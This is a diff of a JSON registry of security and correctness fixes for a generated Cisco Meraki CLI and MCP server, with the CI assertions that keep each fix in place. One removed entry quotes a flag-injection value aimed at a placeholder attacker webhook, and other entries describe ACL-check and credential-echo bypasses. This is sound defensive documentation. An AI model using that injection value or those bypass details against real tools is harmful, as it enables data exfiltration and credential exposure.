@@ -115,54 +115,6 @@
    ]
   },
   {
-   "id": "mcp-recipe-argv-not-flag-like",
-   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. Guarded call site: handleLocateAMacFromASocAlert (the locate_a_mac_from_a_soc_alert intent, `fleet find <ref>`).",
-   "why": "Reachable here: press 4.33.5 still emits the unguarded recipe path, and internal/mcp/intents.go handleLocateAMacFromASocAlert called appendRecipePositional(args, input[\"ref\"], true) with no check, so the MCP tool call {\"ref\": \"--deliver=webhook:https://attacker/\"} ran `fleet find --deliver=webhook:https://attacker/ --agent` and pflag parsed the value as the denylisted root --deliver flag (proven on this connector 2026-10-13: with the guard stubbed out, TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional fails showing exactly that argv; with the guard it passes). Fleet origin: found by Codex adversarial review of the mcp-argv-value-joined backport (2026-09-09); upstream cli-printing-press fixed cliArgsFromMCP (#4647, present in 4.33.5's shellout.go) but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. The factory's tools/apply_handfixes.py re-applies the intents.go edit after a regenerate; the two tests in recipe_intents_test.go must be restored by hand. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "not_contains": "\"--\"+name, selected"
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "func rejectFlagLikeRecipeValue(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if err := rejectFlagLikeRecipeValue(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "func TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "meraki-mcp-execute-link-next",
    "summary": "The MCP cisco-meraki_execute tool marks a GET result has_more when the response's Link header names another page: with next_starting_after when the whole upstream page fit in the (50-item) MCP result, and, when the result was truncated to fit (a bare array marked truncated, or an object envelope marked _pp_truncated, including a truncated last page), a note to re-request with a smaller perPage instead of a cursor that would skip the cut items",
    "why": "Every non-fleet operation reaches MCP agents through cisco-meraki_execute, which sends one GET and dropped the Link header, so an agent asking for network clients (default perPage 10 on many endpoints) silently got page one - the failure meraki-link-pagination fixed for sync, --all and fleet but not this twin path. Found by the fresh-context adversarial review (2026-10-13). The result is already capped at 50 items per MCP call, so the fix reports the cursor rather than walking every page. Helpers live in the hand-authored internal/cli/meraki_link_pagination.go (WithMerakiLinkNext, AnnotateMerakiNextPage); the three call-site lines in generated code_orch.go are re-applied by the factory's tools/apply_handfixes.py. TestCodeOrchExecuteReportsMerakiNextPage fails with the annotation removed (proven 2026-10-13). Round-2 adversarial review (2026-10-13) caught that the first version offered the Link cursor even when bound truncated a large page to 50 items, so following it skipped items 51..perPage; TestCodeOrchExecuteTruncatedPageWithholdsCursor fails on that version (proven) and a 1,200-item walk through the real MCP binary following the tool's own instructions returned all 1,200 with no gaps. Round 3 (2026-10-13) caught the object-envelope twin ({items:[...]} cut in place with _pp_truncated, e.g. switch port statuses by switch) and a truncated last page; TestCodeOrchExecuteTruncatedEnvelopeWithholdsCursor fails on the round-2 version (proven), and a 60-switch envelope walk following only the tool's notes returned all 60. Round 4 (2026-10-13): the cut-page note now carries the exact page size for bare arrays (they set both truncated and _pp_truncated), and is emitted only for endpoints that take perPage (codeOrchTakesPerPage, hand-authored internal/mcp/meraki_execute.go) - a switch's 52 ports keep bound's own note instead of advice to shrink a page that does not exist.",
@@ -1266,7 +1218,7 @@
   },
   {
    "id": "meraki-search-auto-is-local",
-   "summary": "`search` reads the local mirror in the default auto mode and refuses --data-source live with a pointer to `fleet find`. The generated command called GET /organizations/{organizationId}/clients/search with the path parameter never filled, so every bare `search <query>` (the command's own help example) exited 5 before any request.",
+   "summary": "`search` reads the local mirror in the default auto mode and refuses --data-source live with a pointer to `fleet find`. The generated command called GET /organizations/{organizationId}/clients/search with the path parameter never filled, so every bare `search <query>` (the command's own help example) exited 5 before any request. Press 4.35.1 renders this natively (reason label no_search_endpoint); the asserts pin it against a regression.",
    "why": "Adversarial round 16 (2026-10-14): `search \"Bayside\"` exited 5 with 'unresolved path parameter {organizationId}' and never fell back to the mirror, while governance.md and page.json list `search` as the Allow-tier mirror read. Meraki has no account-wide search endpoint, so the live branch is removed. Proven against the factory fake: after `sync`, bare `search \"Bayside\"` returns the org and network rows with source local; `--data-source live` exits 2 with the fleet find hint. Round 17: `search --type organizations_networks` printed 'local store has not been synced yet' right after a sync because dependent resources record sync state per parent; search now checks for any sync. Round 18: with any sync counting, `search --type ssids` (a type sync never stores) returned [] with no hint; a typed search with zero results now says when the mirror holds no rows of that type.",
    "status": "active",
    "spec_encode_followup": "Press retro: the search template should not pick an endpoint whose path has unresolvable parameters.",
@@ -1279,7 +1231,7 @@
     },
     {
      "file": "cli/internal/cli/search.go",
-     "contains": "reason = \"no_live_search\"",
+     "contains": "reason = \"no_search_endpoint\"",
      "min_count": 1,
      "code_only": true
     },
@@ -1502,95 +1454,9 @@
    ]
   },
   {
-   "id": "windows-sddl-alias-sid-compare",
-   "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
-   "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
-   "status": "active",
-   "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "sid, err := windows.StringToSid(alias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "not_contains": "return evalCredsSecurity(sd.String(), me)"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "windows-null-dacl-behind-flags",
-   "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
-   "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
-   "status": "active",
-   "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if len(fields) != 6 {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "no-create-alias-on-destructive-commands",
    "class": "create-alias-on-destructive",
-   "summary": "The generator's hidden Cobra alias `create` is removed from the 15 commands listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs them",
+   "summary": "The generator's hidden Cobra alias `create` is removed from the 15 commands listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs them Reprint 4.35.1 (2026-11-02): networks sm create-network-bypass-activation-lock-attempt newly got the alias; removed.",
    "why": "cli-printing-press gives a POST endpoint command the hidden alias `create`. On these commands the POST is destructive, so an agent that guessed the conventional verb (`<group> create`) ran the destructive call, and the alias appeared nowhere in help, agent-context or governance.md. Reproduced on origin/main 6416a241b against a local fake server: `maxio-cli subscriptions purge-json create sub_123 --ack 1` sent POST /subscriptions/sub_123/purge.json, `sentinelone-cli reports create` sent POST /reports/delete-reports and `tactical-rmm-cli agents shutdown create agent-42` sent POST /agents/agent-42/shutdown/. Fleet gate: tools/maintainer/check_command_tree.py, which walks the real cli.RootCmd() tree (137 such commands in 28 connectors on 6416a241b, 0 after). The canonical command names are unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate fails while the alias is present. Commands here: devices appliance create-device-interfaces-ports-update (POST /devices/{serial}/appliance/interfaces/ports/update); devices cellular create-device-uplinks-bands-masks-update (POST /devices/{serial}/cellular/uplinks/bands/masks/update); devices reboot device (POST /devices/{serial}/reboot); devices sensor create-device-command (POST /devices/{serial}/sensor/commands); networks bind network (POST /networks/{networkId}/bind); networks firmware-upgrades create-network-rollback (POST /networks/{networkId}/firmwareUpgrades/rollbacks); networks pii create-network-request (POST /networks/{networkId}/pii/requests); networks split network (POST /networks/{networkId}/split); networks unbind network (POST /networks/{networkId}/unbind); organizations action-batches create-organization-action-batch (POST /organizations/{organizationId}/actionBatches); organizations campus-gateway batch-organization-clusters-tunneling-update (POST /organizations/{organizationId}/campusGateway/clusters/tunneling/batchUpdate); organizations integrations disable-organization-xdr-networks (POST /organizations/{organizationId}/integrations/xdr/networks/disable); organizations licensing move-organization-coterm-licenses (POST /organizations/{organizationId}/licensing/coterm/licenses/move); organizations spaces remove-organization-integration (POST /organizations/{organizationId}/spaces/integration/remove); organizations switch clone-organization-devices (POST /organizations/{organizationId}/switch/devices/clone).",
    "status": "active",
    "spec_encode_followup": "Press-side: emit the `create` alias only for operations that create something.",
@@ -1660,61 +1526,10 @@
      "contains": "func TestDestructiveCommandsDoNotAnswerToCreate(",
      "min_count": 1,
      "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; CISCO_MERAKI_MCP_READ_ONLY is preset to \"1\" in every config block and the .mcpb default; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
     },
     {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"CISCO_MERAKI_MCP_READ_ONLY\": \"1\"",
-     "min_count": 3
-    },
-    {
-     "file": "manifest.json",
-     "contains": "Preset to 1; clear it only when you want the agent to make changes.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
+     "file": "cli/internal/cli/networks_sm_create-network-bypass-activation-lock-attempt.go",
+     "not_contains": "[]string{\"create\"}"
     }
    ]
   },
@@ -1775,154 +1590,197 @@
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the title of an HTML page returned where JSON was expected. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "id": "meraki-single-credential-env",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
+   "summary": "The CLI and MCP server read ONE credential env var, MERAKI_DASHBOARD_API_KEY (the Meraki SDK's canonical name); the press's slug-derived CISCO_MERAKI_API_KEY alias is removed from config, credentials, the client mask list and every auth hint",
+   "why": "Unrecorded hand edit in the published 0.1.3 tree (found by diffing it against a 4.33.5 re-render, 2026-11-02): the press adds CISCO_MERAKI_API_KEY beside the spec's x-auth-env-vars entry, and every install surface (manifest, server.json, README) names only MERAKI_DASHBOARD_API_KEY. Re-applied on 4.35.1 by the reprint run's bin/resolve.sh + bin/reapply_env.py.",
+   "spec_encode_followup": "Not spec-encodable on 4.35.1 (x-auth-env-vars with one entry still gets the slug alias). Press retro: no slug alias when x-auth-env-vars is declared.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
+     "file": "cli/internal/config/config.go",
+     "not_contains": "CISCO_MERAKI_API_KEY"
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
+     "file": "cli/internal/config/config.go",
+     "not_contains": "CiscoMerakiApiKey"
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
+     "file": "cli/internal/cliutil/credentials.go",
+     "not_contains": "CiscoMerakiApiKey"
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
+     "not_contains": "CISCO_MERAKI_API_KEY"
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "bodyText := truncateBody(respBody)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.shownSummary(respBody, summary, authHeader)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownSummary(body []byte, summary string, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/cisco-meraki-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/cisco-meraki-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/cisco-meraki-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
-     "code_only": true
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "CISCO_MERAKI_API_KEY"
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
+     "not_contains": "CISCO_MERAKI_API_KEY"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "CISCO_MERAKI_API_KEY"
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.EnvOverride(\"MERAKI_DASHBOARD_API_KEY\")",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/cli/agent_context.go",
+     "not_contains": "CISCO_MERAKI_API_KEY"
+    },
+    {
+     "file": "cli/internal/cli/agent_context.go",
+     "contains": "Required:    true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"required\":    true,",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-mcp-mirror-write-confirm",
+   "status": "active",
+   "summary": "Every mirrored MCP tool that can change Meraki data previews and sends only with confirm set to boolean true: fleet_push runs without --apply (its own preview) unless confirm is true; import runs with --dry-run forced on unless confirm is true; read-only and local-only tools are untouched",
+   "why": "Pre-review finding of the 4.35.1 reprint (2026-11-02): over MCP, fleet_push with apply:true sent action batches and import sent creates with no confirm, while the code-orchestration execute tool already previews until confirm is boolean true. Fail-closed gate (tactical-rmm/skykick design) in hand file internal/mcp/cobratree/meraki_confirm.go, wired after RegisterAll in generated internal/mcp/tools.go (re-applied by the reprint run's bin/reapply.py). TestRegisteredMirroredWritesNeedConfirm and TestMirroredWritesSendOnlyWithBooleanConfirm failed before the gate (proven, logs/seen/mirror-confirm-fails.log).",
+   "spec_encode_followup": "Press retro: mirrored write tools should carry the execute tool's confirm contract natively.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/meraki_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/meraki_confirm.go",
+     "contains": "if confirmed, ok := args[\"confirm\"].(bool); ok && confirmed {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/meraki_confirm_test.go",
+     "contains": "func TestMirroredWritesSendOnlyWithBooleanConfirm(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-row-keys-path-level",
+   "status": "active",
+   "summary": "Spec repair for the 4.35.1 reprint: the 42 x-resource-id keys the factory overlay set on GET operations moved to their path items (the press reads only the path item), plus two new pins: wireless zigbee doorLocks on doorLockId and appliance redundancy byNetwork on networkId; the unreferenced bearerAuth scheme is dropped",
+   "why": "On the 0.1.3 tree the row keys of meraki-row-keys-not-display-names lived only as hand edits in the generated maps; the overlay's operation-level x-resource-id never reached the press, so a reprint silently fell back to display-name keys. With the keys at path level the 4.35.1 render emits every published key natively (sync.go and store.go maps equal the published maps; diff tool bin/idmaps.py). 4.35.1 also keyed doorLocks and the new redundancy byNetwork list on name; both now carry their real identity. Spec: the reprint run's spec.json (bin/prep.py over the factory spec/spec-overlay.json).",
+   "spec_encode_followup": "Spec-encoded. Fold bin/prep.py into the factory overlay before the next print.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"organizations_wireless_zigbee_door_locks\":",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"doorLockId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"organizations_appliance_devices_redundancy_by_network\":",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"policy.id+ruleId\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-push-selection-exact",
+   "status": "active",
+   "summary": "fleet push selects exactly what the operator named: --network-tag, --network (ID or name), --product-type and --org (ID or name) match without case folding",
+   "why": "Codex round 1 of the 4.35.1 reprint (2026-11-02), class push wider than asked: Meraki documents network tag filtering as case-sensitive (spec.json GET /organizations/{organizationId}/networks, parameter tags), but push matched tags, names and IDs with EqualFold, so --network-tag managed also changed a network tagged Managed. TestPushSelectionIsExact failed on the folded matcher (proven, logs/seen/r1-failing.log).",
+   "spec_encode_followup": "Hand code (novel).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "func containsExact(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "orgs = pushOrgsExact(orgs, orgFilter)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "not_contains": "containsFold("
+    },
+    {
+     "file": "cli/internal/cli/meraki_review_r1_test.go",
+     "contains": "func TestPushSelectionIsExact(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-time-compare-parsed",
+   "status": "active",
+   "summary": "fleet admins (latest sign-in) and fleet changes (newest-first order, group first/last) compare Meraki date-times as instants, not text",
+   "why": "Codex round 1 of the 4.35.1 reprint (2026-11-02), class timestamp compared as text: lastActive and configurationChanges ts are RFC 3339 date-times that may carry an offset (spec.json format date-time); a +10:00 sign-in sorted after a later Z one, so an active admin was flagged stale and changes were misordered. TestMerakiTimesCompareAsInstants failed before (proven, logs/seen/r1-failing.log).",
+   "spec_encode_followup": "Hand code (novel).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_common.go",
+     "contains": "func merakiTimeAfter(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_admins.go",
+     "contains": "if merakiTimeAfter(a.LastActive, p.LastActive) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_changes.go",
+     "contains": "merakiTimeAfter(rows[i].TS, rows[j].TS)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_review_r1_test.go",
